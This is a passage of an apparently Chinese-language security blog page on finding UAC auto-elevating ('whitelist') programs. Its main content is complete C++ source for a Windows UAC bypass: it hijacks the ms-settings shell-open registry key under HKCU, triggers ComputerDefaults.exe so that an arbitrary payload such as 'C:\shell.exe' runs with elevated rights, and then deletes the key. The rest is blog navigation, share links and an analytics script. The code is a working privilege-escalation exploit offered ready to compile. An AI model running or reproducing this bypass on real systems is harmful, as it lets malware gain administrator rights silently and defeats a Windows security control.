class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UACcpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line">DWORD <span class="title function_">BypassUAC</span><span class="params">(LPWSTR filePath)</span></span><br><span class="line">&#123;</span><br><span class="line">PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">HKEY hKey;</span><br><span class="line">si.cb = <span class="keyword">sizeof</span>(STARTUPINFO);</span><br><span class="line">si.wShowWindow = SW_HIDE;</span><br><span class="line">DWORD dwDisposition;</span><br><span class="line"><span class="keyword">if</span> (filePath == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] FilePath is null, please try again!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Get filePath success , the filePath is : %ws\n&quot;</span>, filePath);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ERROR_SUCCESS != ::RegCreateKeyW(HKEY_CURRENT_USER,</span><br><span class="line"><span class="string">L&quot;Software\\Classes\\ms-settings\\Shell\\open\\command&quot;</span>, &amp;hKey))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Create regedit failed, error is : %d\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Create regedit successfully!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ERROR_SUCCESS != ::RegSetValueExW(hKey, <span class="literal">NULL</span>, <span class="number">0</span>, REG_SZ,</span><br><span class="line">(BYTE*)filePath, (::lstrlenW(filePath) + <span class="number">1024</span>)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Create exe_key-value failed, error is : %d\n&quot;</span>,</span><br><span class="line">GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Create exe_key-value successfully!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ERROR_SUCCESS != RegSetValueExW(hKey, <span class="string">L&quot;DelegateExecute&quot;</span>, <span class="number">0</span>, REG_SZ,</span><br><span class="line">(BYTE*)<span class="string">&quot;&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;&quot;</span>)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Create delete_key-value failed, error is : %d\n&quot;</span>,</span><br><span class="line">GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Create delete_key-value successfully!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == CreateProcessA(<span class="string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>, (LPSTR)<span class="string">&quot;/c</span></span><br><span class="line"><span class="string">C:\\Windows\\System32\\ComputerDefaults.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE,</span><br><span class="line">NORMAL_PRIORITY_CLASS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Create Process failed, error is : %d\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Create Process successfully!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Sleep(<span class="number">3000</span>);</span><br><span class="line"><span class="keyword">if</span> (ERROR_SUCCESS != ::RegDeleteTreeW(HKEY_CURRENT_USER,</span><br><span class="line"><span class="string">L&quot;Software\\Classes\\ms-settings&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Delete regedit failed, error is : %d\n&quot;</span>, GetLastError());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Delete regedit successfully!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">wmain</span><span class="params">(<span class="type">int</span> argc, <span class="type">wchar_t</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;UAC.exe &lt;filepath&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;UAC.exe C:\\shell.exe&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">LPWSTR filePath = argv[<span class="number">1</span>];</span><br><span class="line">BypassUAC(filePath);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/posts/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/sergodeeva">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UAC%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98"><span class="toc-number">1.</span> <span class="toc-text">UAC白名单挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#VS2022%E9%87%8C%E9%9D%A2%E7%9A%84UAC"><span class="toc-number">1.0.1.</span> <span class="toc-text">VS2022里面的UAC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEUAC%E7%99%BD%E5%90%8D%E5%8D%95%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">寻找UAC白名单文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81"><span class="toc-number">1.2.</span> <span class="toc-text">验证</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/10/08/UAC/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/10/08/UAC/&text="><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/10/08/UAC/&title="><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/10/08/UAC/&is_video=false&description="><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://example.com/2024/10/08/UAC/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/10/08/UAC/&title="><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/10/08/UAC/&title="><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/10/08/UAC/&title="><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/10/08/UAC/&title="><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/10/08/UAC/&name=&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2024 John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/posts/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/sergodeeva">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Google Analytics -->
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-37473492-6', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+
+
